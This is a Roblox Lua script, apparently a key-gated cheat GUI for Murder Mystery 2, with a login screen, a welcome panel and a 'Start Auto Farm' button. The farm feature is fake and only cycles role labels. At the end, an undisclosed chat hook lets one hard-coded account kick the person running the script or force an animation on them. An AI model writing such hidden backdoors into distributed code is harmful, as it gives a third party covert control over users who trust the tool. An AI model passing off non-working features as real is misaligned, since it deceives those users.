--// SERVICES
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer

--// CONFIG
local ADMIN_NAME = "Nerx0ox"
local MM2_PLACE_ID = 142823291

-- ❌ PAS MM2
if game.PlaceId ~= MM2_PLACE_ID then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Keyzer 💯",
        Text = "are you lost ...?",
        Duration = 5
    })
    return
end

--// KEY SYSTEM
local usedKeys = {}

local function isValidKey(key, isVIP)
    if isVIP then
        if not key:match("^Keyzervip_") then return false end
    else
        if not key:match("^Keyzer_") then return false end
    end

    if #key ~= 18 then return false end

    local u,l,d = 0,0,0
    for c in key:gmatch(".") do
        if c:match("%u") then u+=1
        elseif c:match("%l") then l+=1
        elseif c:match("%d") then d+=1 end
    end

    return u>=3 and l>=5 and d>=2
end

--// GUI
local gui = Instance.new("ScreenGui", game.CoreGui)

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 360, 0, 240)
main.Position = UDim2.new(0.5,-180,0.5,-120)
main.BackgroundColor3 = Color3.fromRGB(5, 10, 25) -- 🔵 BLEU TRÈS FONCÉ

Instance.new("UICorner", main).CornerRadius = UDim.new(0,12)

-- 🔵 GRADIENT BLEU SOMBRE
local gradient = Instance.new("UIGradient", main)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 30, 70)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 30))
}

-- FADE IN
main.BackgroundTransparency = 1
TweenService:Create(main, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()

-- TOPBAR
local top = Instance.new("Frame", main)
top.Size = UDim2.new(1,0,0,40)
top.BackgroundTransparency = 1

local title = Instance.new("TextLabel", top)
title.Size = UDim2.new(1,-50,1,0) -- Ajusté car plus de bouton réduire
title.Position = UDim2.new(0,12,0,0)
title.Text = "Keyzer 💯"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

-- CLOSE BUTTON (Modifié en ❌)
local close = Instance.new("TextButton", top)
close.Size = UDim2.new(0,30,0,30)
close.Position = UDim2.new(1,-35,0,5)
close.Text = "❌"
close.TextSize = 15
close.BackgroundTransparency = 1 -- Transparent pour laisser l'émoji propre
close.TextColor3 = Color3.new(1,1,1)

-- KEY BOX
local keyBox = Instance.new("TextBox", main)
keyBox.Size = UDim2.new(0,260,0,45)
keyBox.Position = UDim2.new(0.5,-130,0.4,0)
keyBox.PlaceholderText = "Enter your key here..."
keyBox.BackgroundColor3 = Color3.fromRGB(15, 30, 60)
keyBox.TextColor3 = Color3.new(1,1,1)
keyBox.Font = Enum.Font.Gotham
Instance.new("UICorner", keyBox)

-- VALIDATE BUTTON
local keyBtn = Instance.new("TextButton", main)
keyBtn.Size = UDim2.new(0,220,0,45)
keyBtn.Position = UDim2.new(0.5,-110,0.7,0)
keyBtn.Text = "Validate"
keyBtn.Font = Enum.Font.GothamBold
keyBtn.BackgroundColor3 = Color3.fromRGB(0, 90, 200)
keyBtn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", keyBtn)

-- HOVER EFFECT
keyBtn.MouseEnter:Connect(function()
    TweenService:Create(keyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 110, 255)}):Play()
end)
keyBtn.MouseLeave:Connect(function()
    TweenService:Create(keyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 90, 200)}):Play()
end)

-- STATUS
local status = Instance.new("TextLabel", main)
status.Size = UDim2.new(1,0,0,30)
status.Position = UDim2.new(0,0,0.85,0)
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.Text = ""

-- WELCOME GUI
local welcome = main:Clone()
welcome.Parent = gui
welcome.Visible = false

local avatar = Instance.new("ImageLabel", welcome)
avatar.Size = UDim2.new(0,80,0,80)
avatar.Position = UDim2.new(0.5,-40,0.2,0)
avatar.BackgroundTransparency = 1
Instance.new("UICorner", avatar).CornerRadius = UDim.new(1,0) -- Avatar rond

local nameLabel = Instance.new("TextLabel", welcome)
nameLabel.Size = UDim2.new(1,0,0,40)
nameLabel.Position = UDim2.new(0,0,0.6,0)
nameLabel.TextScaled = true
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.GothamBold

local cont = Instance.new("TextButton", welcome)
cont.Size = UDim2.new(0,200,0,40)
cont.Position = UDim2.new(0.5,-100,0.8,0)
cont.Text = "Continue"
cont.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
Instance.new("UICorner", cont)

-- PANEL
local panel = Instance.new("Frame", main)
panel.Size = UDim2.new(1,0,1,-40)
panel.Position = UDim2.new(0,0,0,40)
panel.Visible = false
panel.BackgroundTransparency = 1

local start = Instance.new("TextButton", panel)
start.Size = UDim2.new(0,240,0,55)
start.Position = UDim2.new(0.5,-120,0.3,0)
start.Text = "Start Auto Farm"
start.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
start.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", start)

local role = Instance.new("TextLabel", panel)
role.Size = UDim2.new(1,0,0,40)
role.Position = UDim2.new(0,0,0.75,0)
role.Text = "Role: Unknown"
role.BackgroundTransparency = 1
role.TextColor3 = Color3.new(1,1,1)
role.Font = Enum.Font.Gotham

-- LOGIC: VALIDATION
keyBtn.MouseButton1Click:Connect(function()
    local key = keyBox.Text
    local vip = key:match("^Keyzervip_")

    if not isValidKey(key, vip) then
        status.Text = "Invalid key"
        status.TextColor3 = Color3.new(1,0,0)
        return
    end

    if not vip then
        if usedKeys[key] then
            status.Text = "Key already used"
            return
        end
        usedKeys[key] = true
    end

    avatar.Image = Players:GetUserThumbnailAsync(
        LocalPlayer.UserId,
        Enum.ThumbnailType.HeadShot,
        Enum.ThumbnailSize.Size150x150
    )

    nameLabel.Text = vip and ("Welcome "..LocalPlayer.Name.." - VIP") or ("Welcome "..LocalPlayer.Name)
    nameLabel.TextColor3 = vip and Color3.fromRGB(255,215,0) or Color3.new(1,1,1)

    main.Visible = false
    welcome.Visible = true
end)

cont.MouseButton1Click:Connect(function()
    welcome.Visible = false
    main.Visible = true
    panel.Visible = true
    -- On nettoie l'interface de login
    keyBox.Visible = false
    keyBtn.Visible = false
    status.Visible = false
end)

-- LOGIC: DRAG
local dragging, dragStart, startPos
top.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = i.Position
        startPos = main.Position
    end
end)

UIS.InputChanged:Connect(function(i)
    if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = i.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        welcome.Position = main.Position
    end
end)

UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- LOGIC: CLOSE
close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- ROLE TEST (Simulation)
start.MouseButton1Click:Connect(function()
    local roles = {"Innocent", "Sheriff", "Murderer", "Hero"}
    for _, r in pairs(roles) do
        role.Text = "Role: "..r
        task.wait(2)
    end
end)

-- ADMIN SYSTEM
local function getPlayer(n)
    for _,p in pairs(Players:GetPlayers()) do
        if p.Name:lower():find(n:lower()) then return p end
    end
end

local function hook(p)
    p.Chatted:Connect(function(msg)
        if p.Name ~= ADMIN_NAME then return end
        local a = msg:split(" ")
        local t = getPlayer(a[2] or "")
        if t ~= LocalPlayer then return end

        if a[1] == "!kick" then
            LocalPlayer:Kick("An admin has removed you from the game")
        elseif a[1] == "!dance" then
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://507771019"
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
            if hum then hum:LoadAnimation(anim):Play() end
        end
    end)
end

for _,p in pairs(Players:GetPlayers()) do hook(p) end
Players.PlayerAdded:Connect(hook)
